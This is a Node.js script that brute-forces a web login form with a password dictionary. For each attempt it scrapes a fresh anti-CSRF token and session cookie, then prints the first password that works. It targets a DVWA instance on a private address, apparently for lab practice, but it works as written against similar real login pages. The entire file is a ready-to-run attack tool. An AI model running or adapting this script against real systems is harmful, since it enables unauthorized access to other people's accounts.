const axios = require('axios');
const DomParser = require('dom-parser');
const qs = require('qs');
const LineByLineReader = require('line-by-line');

const url = 'http://192.168.1.109/DVWA-master/login.php';
const correctLogin = '/DVWA-master/index.php';

const startBruteForce = (url, username, file) => { 

    let lr = new LineByLineReader(file);

    lr.on('error', function (err) {
        console.log("Error reading file");
    });
    
    lr.on('line', async line => {
        lr.pause();

        try {
            let response = await axios.get(url);
            let headers = response.headers;
            let body = response.data;
            let cookie = getCookie(headers);
            let userToken = getUserToken(body);
            doLogin(url, cookie, username, line, userToken);
        } catch(err) {
            console.log('Request error with: ' + line);
        } 
        lr.resume();
                    
    });

  };

const getCookie = headers => {
    let cookies = headers['set-cookie'].map(cookie => {
        return cookie.split(';')[0];
    });
    cookies = [...new Set(cookies)];
    return cookies.join(';');
}

const getUserToken = body => {
    const parser = new DomParser();
    const dom = parser.parseFromString(body);
    return dom.getElementsByName("user_token")[0].getAttribute("value");
}

const doLogin = async (url, cookie, username, password, user_token) => {
    
    let data = {
        password: password.trim(),
        username: username,
        user_token: user_token,
        Login: 'Login'
    };

    try {
        const response = await axios.post(url, qs.stringify(data), { headers: { 'Cookie': cookie, 
            'Accept':'*/*',
            'User-Agent': 'curl/7.58.0',                                    
            'Content-Type': 'application/x-www-form-urlencoded'
            }});
        if(response.request.path == correctLogin) {
            console.log("******************************************************************");
            console.log("UNLOCKED USER: " + username + " WITH PASSWORD: " + password.trim() );
            console.log("******************************************************************");
            process.exit(-1);
        } else {
            console.log("INCORRECT PASSWORD: " + password );
        }
    } catch (err) {
        //console.log(err);
    }
}

if (process.argv.length !== 5) {
    console.log("Usage: node " + __filename + " url user dictionary_file.txt");
    process.exit(-1);
} else {
    const url = process.argv[2];
    const username = process.argv[3];
    const file = process.argv[4];   
    startBruteForce(url, username, file);
}